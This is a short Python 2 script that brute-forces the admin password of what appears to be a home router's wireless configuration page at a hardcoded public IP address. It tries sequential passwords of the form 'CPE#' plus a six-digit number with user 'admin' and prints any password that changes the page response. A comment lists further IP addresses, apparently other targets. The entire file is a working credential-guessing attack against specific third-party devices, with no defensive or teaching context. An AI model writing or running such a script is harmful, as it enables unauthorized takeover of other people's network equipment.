# -*- coding: utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup
import socket
import urllib3


#181.52.82.215 181.54.153.14
dic = open('ellipsys.txt','r')
r = requests.get('http://190.68.121.253:8000/html/ntwkall/wlan.asp')
conte = r.content

    
    
for i in range(550,100000):
    
    b='CPE#'+str(i).zfill(6)
        
    print 'probando 190.68.121.253 con admin -- '+b
    r1 = requests.get('http://190.68.121.253:8000/html/ntwkall/wlan.asp', auth=HTTPBasicAuth('admin', b), timeout=2)
        
    conte1 = r1.content
    if conte != conte1:
        print '[+]  password find '+ b
                